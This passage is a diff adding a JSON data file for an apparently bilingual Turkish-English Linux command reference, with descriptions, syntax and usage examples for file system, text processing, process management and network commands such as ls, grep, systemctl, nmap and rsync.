@@ -1,0 +1,4144 @@
+[
+  {
+    "cat": "fileSystem",
+    "cmds": [
+      {
+        "name": "ls",
+        "tr": "Dizin içeriklerini listeler.",
+        "en": "List directory contents.",
+        "syntax": "ls [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "ls -la",
+            "tr": "Gizli dosyalar dahil tümünü listele",
+            "en": "List all including hidden files"
+          },
+          {
+            "c": "ls -lh",
+            "tr": "Boyutları okunabilir formatta göster",
+            "en": "Show sizes in human-readable format"
+          }
+        ]
+      },
+      {
+        "name": "cd",
+        "tr": "Geçerli dizini değiştirir.",
+        "en": "Change the current directory.",
+        "syntax": "cd [DIRECTORY]",
+        "ex": [
+          {
+            "c": "cd /var/www",
+            "tr": "Belirtilen dizine git",
+            "en": "Go to specified directory"
+          },
+          {
+            "c": "cd ..",
+            "tr": "Bir üst dizine git",
+            "en": "Go to parent directory"
+          }
+        ]
+      },
+      {
+        "name": "pwd",
+        "tr": "Geçerli çalışma dizinini yazdırır.",
+        "en": "Print current working directory.",
+        "syntax": "pwd [OPTION]...",
+        "ex": [
+          {
+            "c": "pwd",
+            "tr": "Mevcut dizin yolunu göster",
+            "en": "Show current directory path"
+          }
+        ]
+      },
+      {
+        "name": "mkdir",
+        "tr": "Yeni dizin oluşturur.",
+        "en": "Make directories.",
+        "syntax": "mkdir [OPTION]... DIRECTORY...",
+        "ex": [
+          {
+            "c": "mkdir myfolder",
+            "tr": "Yeni klasör oluştur",
+            "en": "Create new folder"
+          },
+          {
+            "c": "mkdir -p path/to/folder",
+            "tr": "Gerekirse üst dizinleri de oluştur",
+            "en": "Create parent directories as needed"
+          }
+        ]
+      },
+      {
+        "name": "rm",
+        "tr": "Dosya veya dizinleri siler.",
+        "en": "Remove files or directories.",
+        "syntax": "rm [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "rm file.txt",
+            "tr": "Dosyayı sil",
+            "en": "Delete file"
+          },
+          {
+            "c": "rm -rf folder",
+            "tr": "Klasörü ve içindekileri zorla sil",
+            "en": "Force remove directory and contents"
+          }
+        ]
+      },
+      {
+        "name": "cp",
+        "tr": "Dosya ve dizinleri kopyalar.",
+        "en": "Copy files and directories.",
+        "syntax": "cp [OPTION]... SOURCE DEST",
+        "ex": [
+          {
+            "c": "cp file1.txt file2.txt",
+            "tr": "Dosyayı kopyala",
+            "en": "Copy file"
+          },
+          {
+            "c": "cp -r dir1 dir2",
+            "tr": "Dizini yinelemeli kopyala",
+            "en": "Copy directory recursively"
+          }
+        ]
+      },
+      {
+        "name": "mv",
+        "tr": "Dosya taşır veya yeniden adlandırır.",
+        "en": "Move or rename files.",
+        "syntax": "mv [OPTION]... SOURCE DEST",
+        "ex": [
+          {
+            "c": "mv old.txt new.txt",
+            "tr": "Dosyayı yeniden adlandır",
+            "en": "Rename file"
+          },
+          {
+            "c": "mv file.txt /tmp/",
+            "tr": "Dosyayı taşı",
+            "en": "Move file"
+          }
+        ]
+      },
+      {
+        "name": "find",
+        "tr": "Dizin hiyerarşisinde dosya arar.",
+        "en": "Search for files in a directory hierarchy.",
+        "syntax": "find [path] [expression]",
+        "ex": [
+          {
+            "c": "find . -name '*.log'",
+            "tr": ".log uzantılı dosyaları bul",
+            "en": "Find files with .log extension"
+          },
+          {
+            "c": "find / -size +1G",
+            "tr": "1GB'tan büyük dosyaları bul",
+            "en": "Find files larger than 1GB"
+          }
+        ]
+      },
+      {
+        "name": "locate",
+        "tr": "İsimle dosya bulur (veritabanı kullanır).",
+        "en": "Find files by name (uses database).",
+        "syntax": "locate [OPTION]... PATTERN...",
+        "ex": [
+          {
+            "c": "locate nginx.conf",
+            "tr": "Dosyanın konumunu hızlıca bul",
+            "en": "Quickly find file location"
+          }
+        ]
+      },
+      {
+        "name": "touch",
+        "tr": "Dosya zaman damgalarını değiştirir veya boş dosya oluşturur.",
+        "en": "Change file timestamps or create empty file.",
+        "syntax": "touch [OPTION]... FILE...",
+        "ex": [
+          {
+            "c": "touch newfile.txt",
+            "tr": "Boş dosya oluştur",
+            "en": "Create empty file"
+          }
+        ]
+      },
+      {
+        "name": "ln",
+        "tr": "Dosyalar arasında bağlantı oluşturur.",
+        "en": "Make links between files.",
+        "syntax": "ln [OPTION]... TARGET LINK_NAME",
+        "ex": [
+          {
+            "c": "ln -s /path/target linkname",
+            "tr": "Sembolik bağlantı oluştur",
+            "en": "Create symbolic link"
+          }
+        ]
+      },
+      {
+        "name": "chmod",
+        "tr": "Dosya erişim izinlerini değiştirir.",
+        "en": "Change file mode bits.",
+        "syntax": "chmod [OPTION]... MODE[,MODE]... FILE...",
+        "ex": [
+          {
+            "c": "chmod 755 script.sh",
+            "tr": "Çalıştırma izni ver",
+            "en": "Grant execute permission"
+          }
+        ]
+      },
+      {
+        "name": "chown",
+        "tr": "Dosya sahibi ve grubunu değiştirir.",
+        "en": "Change file owner and group.",
+        "syntax": "chown [OPTION]... [OWNER][:[GROUP]] FILE...",
+        "ex": [
+          {
+            "c": "chown user:group file.txt",
+            "tr": "Sahibi ve grubu değiştir",
+            "en": "Change owner and group"
+          }
+        ]
+      },
+      {
+        "name": "df",
+        "tr": "Dosya sistemi disk alanı kullanımını raporlar.",
+        "en": "Report file system disk space usage.",
+        "syntax": "df [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "df -h",
+            "tr": "Disk kullanımını insan okunabilir göster",
+            "en": "Show disk usage in human readable format"
+          }
+        ]
+      },
+      {
+        "name": "du",
+        "tr": "Dosya alanı kullanımını tahmin eder.",
+        "en": "Estimate file space usage.",
+        "syntax": "du [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "du -sh folder/",
+            "tr": "Klasörün toplam boyutunu göster",
+            "en": "Show total size of folder"
+          }
+        ]
+      },
+      {
+        "name": "mount",
+        "tr": "Dosya sistemini bağlar.",
+        "en": "Mount a file system.",
+        "syntax": "mount -t type device dir",
+        "ex": [
+          {
+            "c": "mount /dev/sdb1 /mnt/usb",
+            "tr": "USB belleği bağla",
+            "en": "Mount USB drive"
+          },
+          {
+            "c": "mount -t nfs 192.168.1.10:/srv/nfs /mnt/dev",
+            "tr": "Uzaktaki NFS dizinini yerel sisteme bağla",
+            "en": "Mount remote NFS directory to local system"
+          }
+        ]
+      },
+      {
+        "name": "umount",
+        "tr": "Dosya sistemini ayırır.",
+        "en": "Unmount file systems.",
+        "syntax": "umount dir",
+        "ex": [
+          {
+            "c": "umount /mnt/usb",
+            "tr": "Bağlı cihazı ayır",
+            "en": "Unmount mounted device"
+          }
+        ]
+      },
+      {
+        "name": "chattr",
+        "tr": "Bir Linux dosya sistemindeki dosya özniteliklerini değiştirir.",
+        "en": "Change file attributes on a Linux file system.",
+        "syntax": "chattr [ -RVf ] [ -v version ] [ mode ] files...",
+        "ex": [
+          {
+            "c": "chattr +i file.txt",
+            "tr": "Dosyayı değiştirilemez yap",
+            "en": "Make file immutable"
+          }
+        ]
+      },
+      {
+        "name": "lsattr",
+        "tr": "Dosya özniteliklerini listeler.",
+        "en": "List file attributes on a Linux second extended file system.",
+        "syntax": "lsattr [ -RVadv ] [ files...  ]",
+        "ex": [
+          {
+            "c": "lsattr file.txt",
+            "tr": "Dosya özniteliklerini göster",
+            "en": "Show file attributes"
+          }
+        ]
+      },
+      {
+        "name": "stat",
+        "tr": "Dosya veya dosya sistemi durumunu görüntüler.",
+        "en": "Display file or file system status.",
+        "syntax": "stat [OPTION]... FILE...",
+        "ex": [
+          {
+            "c": "stat file.txt",
+            "tr": "Dosya detaylarını göster",
+            "en": "Show file details"
+          }
+        ]
+      },
+      {
+        "name": "file",
+        "tr": "Dosya türünü belirler.",
+        "en": "Determine file type.",
+        "syntax": "file [OPTION...] [FILE...]",
+        "ex": [
+          {
+            "c": "file document.pdf",
+            "tr": "Dosyanın türünü tespit et",
+            "en": "Determine type of file"
+          }
+        ]
+      },
+      {
+        "name": "tree",
+        "tr": "Dizin içeriğini ağaç formatında listeler.",
+        "en": "List contents of directories in a tree-like format.",
+        "syntax": "tree [options] [directory]",
+        "ex": [
+          {
+            "c": "tree -L 2",
+            "tr": "Ağacı 2 seviye derinliğinde göster",
+            "en": "Show tree 2 levels deep"
+          }
+        ]
+      },
+      {
+        "name": "basename",
+        "tr": "Dosya adından dizin ve ek kısımları çıkarır.",
+        "en": "Strip directory and suffix from filenames.",
+        "syntax": "basename NAME [SUFFIX]",
+        "ex": [
+          {
+            "c": "basename /usr/bin/sort",
+            "tr": "Sadece dosya adını al",
+            "en": "Get only filename"
+          }
+        ]
+      },
+      {
+        "name": "dirname",
+        "tr": "Dosya adından dizin kısmını çıkarır.",
+        "en": "Strip last component from file name.",
+        "syntax": "dirname [OPTION] NAME...",
+        "ex": [
+          {
+            "c": "dirname /usr/bin/sort",
+            "tr": "Sadece dizin yolunu al",
+            "en": "Get only directory path"
+          }
+        ]
+      },
+      {
+        "name": "realpath",
+        "tr": "Çözümlenmiş mutlak dosya yolunu yazdırır.",
+        "en": "Print the resolved absolute file name.",
+        "syntax": "realpath [OPTION]... FILE...",
+        "ex": [
+          {
+            "c": "realpath file.txt",
+            "tr": "Mutlak yolu göster",
+            "en": "Show absolute path"
+          }
+        ]
+      },
+      {
+        "name": "shred",
+        "tr": "Dosyaları güvenli bir şekilde siler.",
+        "en": "Overwrite a file to hide its contents, and optionally delete it.",
+        "syntax": "shred [OPTION]... FILE...",
+        "ex": [
+          {
+            "c": "shred -u secret.txt",
+            "tr": "Dosyayı geri getirilemez şekilde sil",
+            "en": "Securely delete file"
+          }
+        ]
+      },
+      {
+        "name": "rsync (Gelişmiş Senkronizasyon)",
+        "tr": "Yerel veya uzak sunucular arasında dosyaları kopyalarken/senkronize ederken, sadece değişen kısımları göndererek inanılmaz hız tasarrufu sağlayan araç.",
+        "en": "Tool that synchronizes files locally or remotely by sending only the changed parts, saving incredible bandwidth and time.",
+        "syntax": "rsync [seçenekler] kaynak hedef",
+        "ex": [
+          {
+            "c": "rsync -avz --progress /yedek/ user@192.168.1.10:/uzak/yedek/",
+            "tr": "Yerel dizini uzak sunucuya arşivle (-a), sıkıştır (-z) ve ilerlemeyi göster (--progress). Kopan bağlantıda kaldığı yerden devam eder.",
+            "en": "Archive (-a), compress (-z) and show progress while syncing local dir to remote server. Resumes if connection drops."
+          }
+        ]
+      },
+      {
+        "name": "ncdu (Görsel Disk Kullanımı)",
+        "tr": "Diskteki yerin tam olarak hangi klasörler tarafından tüketildiğini gösteren, terminal içi yön tuşlarıyla gezilebilen interaktif boyut analiz aracı.",
+        "en": "Interactive terminal-based disk usage analyzer, navigable with arrow keys, showing exactly which folders consume space.",
+        "syntax": "ncdu [dizin]",
+        "ex": [
+          {
+            "c": "ncdu /",
+            "tr": "Tüm kök dizinini (/) tarar ve en çok yer kaplayan klasörleri en üstte görsel bir bar ile gösterir.",
+            "en": "Scans the entire root directory (/) and displays folders taking the most space at the top with a visual bar."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "textProcessing",
+    "cmds": [
+      {
+        "name": "cat",
+        "tr": "Dosyaları birleştirir ve standart çıktıya yazar.",
+        "en": "Concatenate files and print on the standard output.",
+        "syntax": "cat [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "cat file.txt",
+            "tr": "Dosya içeriğini göster",
+            "en": "Show file content"
+          },
+          {
+            "c": "cat f1.txt f2.txt > f3.txt",
+            "tr": "Dosyaları birleştir",
+            "en": "Merge files"
+          }
+        ]
+      },
+      {
+        "name": "grep",
+        "tr": "Metin içinde desen arar.",
+        "en": "Print lines that match patterns.",
+        "syntax": "grep [OPTION]... PATTERNS [FILE]...",
+        "ex": [
+          {
+            "c": "grep 'error' var/log/syslog",
+            "tr": "Dosyada error kelimesini ara",
+            "en": "Search for error in file"
+          },
+          {
+            "c": "grep -r 'TODO' .",
+            "tr": "Dizinde yinelemeli ara",
+            "en": "Search recursively in directory"
+          }
+        ]
+      },
+      {
+        "name": "sed",
+        "tr": "Metin akışlarını filtreler ve dönüştürür.",
+        "en": "Stream editor for filtering and transforming text.",
+        "syntax": "sed [OPTION]... {script-only-if-no-other-script} [input-file]...",
+        "ex": [
+          {
+            "c": "sed 's/old/new/g' file.txt",
+            "tr": "Metni değiştir",
+            "en": "Replace text"
+          }
+        ]
+      },
+      {
+        "name": "awk",
+        "tr": "Metin işleme dili.",
+        "en": "Pattern scanning and processing language.",
+        "syntax": "awk [POSIX or GNU style options] -f prog-file [--] file ...",
+        "ex": [
+          {
+            "c": "awk '{print $1}' file.txt",
+            "tr": "Her satırın ilk sütununu yazdır",
+            "en": "Print first column of each line"
+          }
+        ]
+      },
+      {
+        "name": "cut",
+        "tr": "Her satırdan bölümleri çıkarır.",
+        "en": "Remove sections from each line of files.",
+        "syntax": "cut OPTION... [FILE]...",
+        "ex": [
+          {
+            "c": "cut -d':' -f1 /etc/passwd",
+            "tr": "Dosyadan kullanıcı adlarını çıkar",
+            "en": "Extract usernames from file"
+          }
+        ]
+      },
+      {
+        "name": "sort",
+        "tr": "Metin dosyası satırlarını sıralar.",
+        "en": "Sort lines of text files.",
+        "syntax": "sort [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "sort file.txt",
+            "tr": "Satırları alfabetik sırala",
+            "en": "Sort lines alphabetically"
+          }
+        ]
+      },
+      {
+        "name": "uniq",
+        "tr": "Tekrarlanan satırları bildirir veya siler.",
+        "en": "Report or omit repeated lines.",
+        "syntax": "uniq [OPTION]... [INPUT [OUTPUT]]",
+        "ex": [
+          {
+            "c": "sort file.txt | uniq",
+            "tr": "Tekrarları kaldır",
+            "en": "Remove duplicates"
+          }
+        ]
+      },
+      {
+        "name": "wc",
+        "tr": "Satır, kelime ve bayt sayısını yazdırır.",
+        "en": "Print newline, word, and byte counts.",
+        "syntax": "wc [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "wc -l file.txt",
+            "tr": "Satır sayısını göster",
+            "en": "Show line count"
+          }
+        ]
+      },
+      {
+        "name": "head",
+        "tr": "Dosyaların ilk kısmını çıkarır.",
+        "en": "Output the first part of files.",
+        "syntax": "head [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "head -n 10 file.txt",
+            "tr": "İlk 10 satırı göster",
+            "en": "Show first 10 lines"
+          }
+        ]
+      },
+      {
+        "name": "tail",
+        "tr": "Dosyaların son kısmını çıkarır.",
+        "en": "Output the last part of files.",
+        "syntax": "tail [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "tail -f /var/log/syslog",
+            "tr": "Dosya sonunu canlı izle",
+            "en": "Watch end of file live"
+          }
+        ]
+      },
+      {
+        "name": "tr",
+        "tr": "Karakterleri çevirir veya siler.",
+        "en": "Translate or delete characters.",
+        "syntax": "tr [OPTION]... SET1 [SET2]",
+        "ex": [
+          {
+            "c": "echo 'hello' | tr 'a-z' 'A-Z'",
+            "tr": "Büyük harfe çevir",
+            "en": "Convert to uppercase"
+          }
+        ]
+      },
+      {
+        "name": "diff",
+        "tr": "Dosyaları satır satır karşılaştırır.",
+        "en": "Compare files line by line.",
+        "syntax": "diff [OPTION]... FILES",
+        "ex": [
+          {
+            "c": "diff file1.txt file2.txt",
+            "tr": "İki dosya arasındaki farkları bul",
+            "en": "Find differences between two files"
+          }
+        ]
+      },
+      {
+        "name": "patch",
+        "tr": "Bir diff dosyasını orijinaline uygular.",
+        "en": "Apply a diff file to an original.",
+        "syntax": "patch [options] [originalfile [patchfile]]",
+        "ex": [
+          {
+            "c": "patch < fix.diff",
+            "tr": "Yamayı uygula",
+            "en": "Apply patch"
+          }
+        ]
+      },
+      {
+        "name": "paste",
+        "tr": "Dosyaların satırlarını birleştirir.",
+        "en": "Merge lines of files.",
+        "syntax": "paste [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "paste file1.txt file2.txt",
+            "tr": "Satırları yan yana birleştir",
+            "en": "Merge lines side by side"
+          }
+        ]
+      },
+      {
+        "name": "join",
+        "tr": "Ortak bir alana sahip iki dosyanın satırlarını birleştirir.",
+        "en": "Join lines of two files on a common field.",
+        "syntax": "join [OPTION]... FILE1 FILE2",
+        "ex": [
+          {
+            "c": "join file1.txt file2.txt",
+            "tr": "Ortak sütuna göre birleştir",
+            "en": "Join by common column"
+          }
+        ]
+      },
+      {
+        "name": "nl",
+        "tr": "Satır numaralarını ekler.",
+        "en": "Number lines of files.",
+        "syntax": "nl [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "nl file.txt",
+            "tr": "Satır numaraları ile yazdır",
+            "en": "Print with line numbers"
+          }
+        ]
+      },
+      {
+        "name": "zcat",
+        "tr": "Sıkıştırılmış dosyaların içeriğini gösterir.",
+        "en": "View contents of compressed files.",
+        "syntax": "zcat [ -S suffix ] [ name ...  ]",
+        "ex": [
+          {
+            "c": "zcat file.gz",
+            "tr": "Sıkıştırılmış dosya içeriğini gör",
+            "en": "View compressed file content"
+          }
+        ]
+      },
+      {
+        "name": "zgrep",
+        "tr": "Sıkıştırılmış dosyalarda metin arar.",
+        "en": "Search possibly compressed files for a regular expression.",
+        "syntax": "zgrep [ grep_options ] [ -e ] pattern filename...",
+        "ex": [
+          {
+            "c": "zgrep 'error' log.gz",
+            "tr": "Gz dosyasında error kelimesini ara",
+            "en": "Search for error in gz file"
+          }
+        ]
+      },
+      {
+        "name": "awk (Gelişmiş Metin Analizi)",
+        "tr": "Metin dosyalarını sütunlara (column) ve alanlara (field) göre parçalamak, filtrelemek ve matematiksel işlemler yapmak için kullanılan güçlü bir dil.",
+        "en": "A powerful language used to split text files by columns/fields, filter data, and perform mathematical operations.",
+        "syntax": "awk 'pattern {action}' dosya",
+        "ex": [
+          {
+            "c": "awk -F: '$3 >= 1000 {print $1}' /etc/passwd",
+            "tr": "-F: ile ayırıcıyı iki nokta üst üste belirle. 3. sütunu (UID) 1000 ve üzeri olan (gerçek kullanıcıların) 1. sütununu (isimlerini) ekrana bas.",
+            "en": "Set delimiter to ':' with -F:. Print the 1st column (names) where the 3rd column (UID) is >= 1000 (real users)."
+          },
+          {
+            "c": "ls -l | awk '{sum += $5} END {print sum}'",
+            "tr": "Dizindeki tüm dosyaların boyutlarını (5. sütun) topla ve toplam bayt miktarını ekrana yaz.",
+            "en": "Sum the sizes (5th column) of all files in the directory and print total bytes."
+          }
+        ]
+      },
+      {
+        "name": "sed (Akış Düzenleyici)",
+        "tr": "Dosyayı açmadan (non-interactive) içeriğindeki kelimeleri bulmak, değiştirmek veya silmek için kullanılan akış düzenleyicisi.",
+        "en": "Stream editor used to find, replace, or delete words in a file without opening it (non-interactive).",
+        "syntax": "sed 's/eski/yeni/g' dosya",
+        "ex": [
+          {
+            "c": "sed -i 's/eski_ip/yeni_ip/g' config.txt",
+            "tr": "-i (in-place) parametresi ile dosyadaki 'eski_ip' geçen tüm yerleri 'yeni_ip' olarak kalıcı şekilde değiştir.",
+            "en": "Use -i (in-place) to permanently replace all occurrences of 'eski_ip' with 'yeni_ip' in the file."
+          },
+          {
+            "c": "sed '/^#/d' config.conf",
+            "tr": "Bir konfigürasyon dosyasındaki '#' (yorum) ile başlayan satırları ekrandan silerek (dosyayı bozmadan) temiz bir görünüm sağla.",
+            "en": "Remove lines starting with '#' (comments) from the display to provide a clean view of a config file."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "processManagement",
+    "cmds": [
+      {
+        "name": "ps",
+        "tr": "Mevcut süreçlerin durumunu raporlar.",
+        "en": "Report a snapshot of the current processes.",
+        "syntax": "ps [options]",
+        "ex": [
+          {
+            "c": "ps aux",
+            "tr": "Tüm süreçleri listele",
+            "en": "List all processes"
+          }
+        ]
+      },
+      {
+        "name": "top",
+        "tr": "Linux görevlerini görüntüler.",
+        "en": "Display Linux tasks.",
+        "syntax": "top",
+        "ex": [
+          {
+            "c": "top",
+            "tr": "Süreçleri canlı izle",
+            "en": "Watch processes live"
+          }
+        ]
+      },
+      {
+        "name": "htop",
+        "tr": "Etkileşimli süreç görüntüleyici.",
+        "en": "Interactive process viewer.",
+        "syntax": "htop",
+        "ex": [
+          {
+            "c": "htop",
+            "tr": "Renkli ve interaktif süreç izleyici",
+            "en": "Colorful and interactive process viewer"
+          }
+        ]
+      },
+      {
+        "name": "kill",
+        "tr": "Sürece sinyal gönderir (genellikle sonlandırmak için).",
+        "en": "Send a signal to a process (usually to terminate).",
+        "syntax": "kill [options] <pid>...",
+        "ex": [
+          {
+            "c": "kill -9 1234",
+            "tr": "Süreci zorla sonlandır",
+            "en": "Force kill process"
+          }
+        ]
+      },
+      {
+        "name": "killall",
+        "tr": "Süreçleri isimlerine göre sonlandırır.",
+        "en": "Kill processes by name.",
+        "syntax": "killall [options] name",
+        "ex": [
+          {
+            "c": "killall nginx",
+            "tr": "Tüm nginx süreçlerini sonlandır",
+            "en": "Kill all nginx processes"
+          }
+        ]
+      },
+      {
+        "name": "nice",
+        "tr": "Bir komutu değiştirilmiş öncelik ile çalıştırır.",
+        "en": "Run a command with modified scheduling priority.",
+        "syntax": "nice [OPTION] [COMMAND [ARG]...]",
+        "ex": [
+          {
+            "c": "nice -n 10 script.sh",
+            "tr": "Düşük öncelikle çalıştır",
+            "en": "Run with low priority"
+          }
+        ]
+      },
+      {
+        "name": "nohup",
+        "tr": "Kapanmalara karşı bağışık bir komut çalıştırır.",
+        "en": "Run a command immune to hangups.",
+        "syntax": "nohup COMMAND [ARG]...",
+        "ex": [
+          {
+            "c": "nohup python script.py &",
+            "tr": "Arka planda kesintisiz çalıştır",
+            "en": "Run in background uninterrupted"
+          }
+        ]
+      },
+      {
+        "name": "bg",
+        "tr": "Görevleri arka planda çalıştırır.",
+        "en": "Put jobs in background.",
+        "syntax": "bg [job_spec ...]",
+        "ex": [
+          {
+            "c": "bg %1",
+            "tr": "Görevi arka plana gönder",
+            "en": "Send job to background"
+          }
+        ]
+      },
+      {
+        "name": "fg",
+        "tr": "Görevleri ön plana getirir.",
+        "en": "Put jobs in foreground.",
+        "syntax": "fg [job_spec]",
+        "ex": [
+          {
+            "c": "fg %1",
+            "tr": "Görevi ön plana al",
+            "en": "Bring job to foreground"
+          }
+        ]
+      },
+      {
+        "name": "jobs",
+        "tr": "Aktif görevleri listeler.",
+        "en": "List active jobs.",
+        "syntax": "jobs [options]",
+        "ex": [
+          {
+            "c": "jobs",
+            "tr": "Arka plan görevlerini göster",
+            "en": "Show background jobs"
+          }
+        ]
+      },
+      {
+        "name": "systemctl",
+        "tr": "Systemd sistemi ve servis yöneticisini kontrol eder.",
+        "en": "Control the systemd system and service manager.",
+        "syntax": "systemctl [OPTIONS...] COMMAND [NAME...]",
+        "ex": [
+          {
+            "c": "systemctl status sshd",
+            "tr": "Servis durumunu kontrol et",
+            "en": "Check service status"
+          },
+          {
+            "c": "systemctl restart nginx",
+            "tr": "Servisi yeniden başlat",
+            "en": "Restart service"
+          }
+        ]
+      },
+      {
+        "name": "service",
+        "tr": "Sistem servislerini çalıştırır.",
+        "en": "Run a System V init script.",
+        "syntax": "service SCRIPT COMMAND",
+        "ex": [
+          {
+            "c": "service apache2 start",
+            "tr": "Servisi başlat",
+            "en": "Start service"
+          }
+        ]
+      },
+      {
+        "name": "pstree",
+        "tr": "Süreçleri ağaç yapısında gösterir.",
+        "en": "Display a tree of processes.",
+        "syntax": "pstree [ -a ] [ -c ] [ -h ] [ -n ] [ -p ] [ -u ]",
+        "ex": [
+          {
+            "c": "pstree -p",
+            "tr": "Ağacı PID'leri ile göster",
+            "en": "Show tree with PIDs"
+          }
+        ]
+      },
+      {
+        "name": "lsof",
+        "tr": "Açık dosyaları listeler.",
+        "en": "List open files.",
+        "syntax": "lsof [ -?abChKlnNOPRtUvVX ] [ -A A ] [ -c c ] [ -+d d ] [ -+D D ]",
+        "ex": [
+          {
+            "c": "lsof -i :80",
+            "tr": "80 portunu kullanan süreçleri göster",
+            "en": "Show processes using port 80"
+          }
+        ]
+      },
+      {
+        "name": "strace",
+        "tr": "Sistem çağrılarını ve sinyallerini izler.",
+        "en": "Trace system calls and signals.",
+        "syntax": "strace [ -dffhiqrtttTvxx ] [ -a column ] [ -e expr ] ... [ -p pid ] ...",
+        "ex": [
+          {
+            "c": "strace -p 1234",
+            "tr": "1234 PID'li sürecin sistem çağrılarını izle",
+            "en": "Trace system calls of PID 1234"
+          }
+        ]
+      },
+      {
+        "name": "pidof",
+        "tr": "Çalışan bir programın süreç kimliğini (PID) bulur.",
+        "en": "Find the process ID of a running program.",
+        "syntax": "pidof [ -s ] [ -c ] [ -n ] [ -x ] [ -o omitpid ] [ -o omitpid..  ]  program",
+        "ex": [
+          {
+            "c": "pidof nginx",
+            "tr": "Nginx süreç kimliğini bul",
+            "en": "Find PID of nginx"
+          }
+        ]
+      },
+      {
+        "name": "pgrep",
+        "tr": "İsme göre süreçleri arar.",
+        "en": "Look up processes based on name and other attributes.",
+        "syntax": "pgrep [options] pattern",
+        "ex": [
+          {
+            "c": "pgrep -u root sshd",
+            "tr": "Root kullanıcısına ait sshd süreçlerini bul",
+            "en": "Find sshd processes of root user"
+          }
+        ]
+      },
+      {
+        "name": "pkill",
+        "tr": "İsme göre süreçlere sinyal gönderir.",
+        "en": "Signal processes based on name and other attributes.",
+        "syntax": "pkill [options] pattern",
+        "ex": [
+          {
+            "c": "pkill -9 nginx",
+            "tr": "Nginx süreçlerini zorla kapat",
+            "en": "Force kill nginx processes"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "network",
+    "cmds": [
+      {
+        "name": "ping",
+        "tr": "Ağ ana bilgisayarına ICMP ECHO_REQUEST gönderir.",
+        "en": "Send ICMP ECHO_REQUEST to network hosts.",
+        "syntax": "ping [OPTION...] HOST",
+        "ex": [
+          {
+            "c": "ping google.com",
+            "tr": "Sunucuya ping at",
+            "en": "Ping server"
+          }
+        ]
+      },
+      {
+        "name": "curl",
+        "tr": "URL ile veri transferi yapar.",
+        "en": "Transfer a URL.",
+        "syntax": "curl [options...] <url>",
+        "ex": [
+          {
+            "c": "curl -O https://example.com/file.zip",
+            "tr": "Dosya indir",
+            "en": "Download file"
+          },
+          {
+            "c": "curl -I https://example.com",
+            "tr": "HTTP başlıklarını getir",
+            "en": "Fetch HTTP headers"
+          }
+        ]
+      },
+      {
+        "name": "wget",
+        "tr": "Dosyaları ağdan indirir.",
+        "en": "The non-interactive network downloader.",
+        "syntax": "wget [option]... [URL]...",
+        "ex": [
+          {
+            "c": "wget https://example.com/file.iso",
+            "tr": "Dosya indir",
+            "en": "Download file"
+          }
+        ]
+      },
+      {
+        "name": "netstat",
+        "tr": "Ağ bağlantılarını, yönlendirme tablolarını vb. yazdırır.",
+        "en": "Print network connections, routing tables, etc.",
+        "syntax": "netstat [address_family_options] [--tcp|-t]",
+        "ex": [
+          {
+            "c": "netstat -tuln",
+            "tr": "Dinlenen portları göster",
+            "en": "Show listening ports"
+          }
+        ]
+      },
+      {
+        "name": "ss",
+        "tr": "Soketleri araştırmak için araç.",
+        "en": "Another utility to investigate sockets.",
+        "syntax": "ss [options]",
+        "ex": [
+          {
+            "c": "ss -tuln",
+            "tr": "Açık portları ve dinleyen servisleri listele",
+            "en": "List open ports and listening services"
+          }
+        ]
+      },
+      {
+        "name": "ifconfig",
+        "tr": "Bir ağ arayüzünü yapılandırır.",
+        "en": "Configure a network interface.",
+        "syntax": "ifconfig [-v] [-a] [-s] [interface]",
+        "ex": [
+          {
+            "c": "ifconfig",
+            "tr": "Ağ arayüzlerini listele",
+            "en": "List network interfaces"
+          }
+        ]
+      },
+      {
+        "name": "ip",
+        "tr": "Yönlendirme, ağ cihazları ve tünelleri gösterir / değiştirir.",
+        "en": "Show / manipulate routing, network devices, and tunnels.",
+        "syntax": "ip [ OPTIONS ] OBJECT { COMMAND | help }",
+        "ex": [
+          {
+            "c": "ip a",
+            "tr": "IP adreslerini göster",
+            "en": "Show IP addresses"
+          }
+        ]
+      },
+      {
+        "name": "nmap",
+        "tr": "Ağ keşfi ve güvenlik denetimi aracı.",
+        "en": "Network exploration tool and security / port scanner.",
+        "syntax": "nmap [Scan Type(s)] [Options] {target specification}",
+        "ex": [
+          {
+            "c": "nmap -p- localhost",
+            "tr": "Tüm portları tara",
+            "en": "Scan all ports"
+          },
+          {
+            "c": "nmap -sV -sC -A 192.168.1.10",
+            "tr": "Açık portları, servis versiyonlarını, OS tespitini ve default betikleri (NSE) çalıştır",
+            "en": "Detect open ports, service versions, OS and run default scripts"
+          }
+        ]
+      },
+      {
+        "name": "ssh",
+        "tr": "Uzak makineye giriş programı (SSH istemcisi).",
+        "en": "OpenSSH remote login client.",
+        "syntax": "ssh [options] destination [command]",
+        "ex": [
+          {
+            "c": "ssh user@host",
+            "tr": "Sunucuya bağlan",
+            "en": "Connect to server"
+          }
+        ]
+      },
+      {
+        "name": "scp",
+        "tr": "Ağdaki ana makineler arasında güvenli kopyalama.",
+        "en": "Secure copy (remote file copy program).",
+        "syntax": "scp [options] [[user@]host1:]file1 ... [[user@]host2:]file2",
+        "ex": [
+          {
+            "c": "scp file.txt user@host:/path",
+            "tr": "Dosyayı sunucuya kopyala",
+            "en": "Copy file to server"
+          }
+        ]
+      },
+      {
+        "name": "rsync",
+        "tr": "Hızlı ve çok yönlü dosya kopyalama aracı.",
+        "en": "A fast, versatile, remote (and local) file-copying tool.",
+        "syntax": "rsync [OPTION...] SRC... [DEST]",
+        "ex": [
+          {
+            "c": "rsync -avz folder/ user@host:/path",
+            "tr": "Klasörü sunucuyla senkronize et",
+            "en": "Sync folder to server"
+          }
+        ]
+      },
+      {
+        "name": "traceroute",
+        "tr": "Ağ paketinin yolunu izler.",
+        "en": "Print the route packets trace to network host.",
+        "syntax": "traceroute [options] host [packetsize]",
+        "ex": [
+          {
+            "c": "traceroute google.com",
